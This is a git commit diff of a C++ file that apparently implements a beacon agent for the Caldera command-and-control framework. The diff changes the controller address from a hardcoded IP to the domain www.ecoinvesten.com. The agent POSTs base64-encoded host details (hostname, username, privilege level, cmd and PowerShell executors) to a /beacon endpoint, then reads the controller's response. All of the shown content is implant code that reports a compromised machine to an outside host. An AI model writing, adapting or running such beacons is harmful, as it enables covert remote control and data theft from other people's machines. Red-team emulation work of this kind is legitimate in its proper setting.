1fedaff373e037a3ce2d593e0ff59995ebde73a3
DillonSingh <100767876+DillonSingh@users.noreply.github.com>
2022-11-01 13:20:26 +0000

    Update HTTP2Caldera.cpp

--- HTTP2Caldera.cpp
+++ HTTP2Caldera.cpp
@@ -14,9 +14,16 @@ using namespace json;
 int main() {
 
 	// HTTP POST Request to C2
-	HINTERNET hRequest = SendRequest("http://34.248.147.52:8888/", 80, "/beacon", "POST", "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybSI6IndpbmRvd3MiLCJob3N0IjoiREVTS1RPUC1UTjFRRE9VIiwidXNlcm5hbWUiOiJhbXJ0aCIsImFyY2hpdGVjdHVyZSI6ImFtZDY0IiwicHJpdmlsZWdlIjoiVXNlciIsICJleGVjdXRvcnMiOlsiY21kIiwgInBzaCJdfQ==");
-	cout << hRequest << "\n";
-	DWORD Length = 0; 
+	HINTERNET hRequest = SendRequest("www.ecoinvesten.com", 80, "/beacon", "POST", "eyJwaWQiOiI5NjAiLCJzZXJ2ZXIiOiJsb2NhbGhvc3QiLCJwbGF0Zm9ybSI6IndpbmRvd3MiLCJob3N0IjoiREVTS1RPUC1UTjFRRE9VIiwidXNlcm5hbWUiOiJhbXJ0aCIsImFyY2hpdGVjdHVyZSI6ImFtZDY0IiwicHJpdmlsZWdlIjoiVXNlciIsICJleGVjdXRvcnMiOlsiY21kIiwgInBzaCJdfQ==");
+	if (hRequest) {
+		std::cout << "Your data was successfully sent";
+		std::cout << hRequest << "\n";
+	}
+	else {
+		std::cout << "Error in sending data" << "\n";
+	}
+
+	DWORD Length =   0; 
 	// Response from C2
 	char* Response = GetResponse(hRequest, &Length);
 	cout << Response << "  " << Length << "\n";
